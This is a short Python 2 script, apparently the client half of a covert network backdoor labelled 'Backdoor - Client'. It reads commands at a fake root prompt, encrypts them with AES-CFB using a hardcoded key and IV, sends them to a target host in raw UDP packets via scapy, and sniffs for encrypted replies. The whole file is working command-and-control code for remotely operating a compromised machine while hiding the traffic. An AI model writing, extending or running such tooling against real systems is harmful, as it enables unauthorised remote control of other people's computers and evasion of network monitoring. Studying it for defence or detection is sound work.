#!/usr/bin/python

import argparse, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Crypto.Cipher import AES

encryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')

def encrypt(data, encrypt=True):
	if encrypt == True:
		ciphertext = encryptionObject.encrypt(data)
		return ciphertext
	elif encrypt == False:
		plaintext = decryptionObject.decrypt(data)
		return plaintext

def sendCommand(args, data):
	ciphertext = encrypt(data)
	pkt = IP(dst=args)/UDP(sport=8000, dport=7999)/Raw(load=ciphertext)
	send(pkt, verbose=0)

# def parse(pkt):
# 	return

def stopFilter(pkt):
	if ARP in pkt:
		return False
	else:
		data = pkt['Raw'].load
		plaintext = encrypt(data, encrypt=False)
		print plaintext
		return True

def sniffPacket():
	sniff(timeout=3, filter="udp and src port 8000 and dst port 7999", stop_filter=stopFilter)


def main():
	parser = argparse.ArgumentParser(description='Backdoor - Client')
	parser.add_argument('-d', '--destination', dest='dest_ip', help='destination IP address', required=True)
	args = parser.parse_args()

	while 1:
		command = raw_input("[root@" +args.dest_ip+"]# ")
		sendCommand(args.dest_ip, command)
		sniffPacket()

if __name__ == '__main__':
	try:		
		main()
	except KeyboardInterrupt:
		print "Exiting.."
	except IndexError:
		print 'No payload in packet'
		print 'Exiting..'
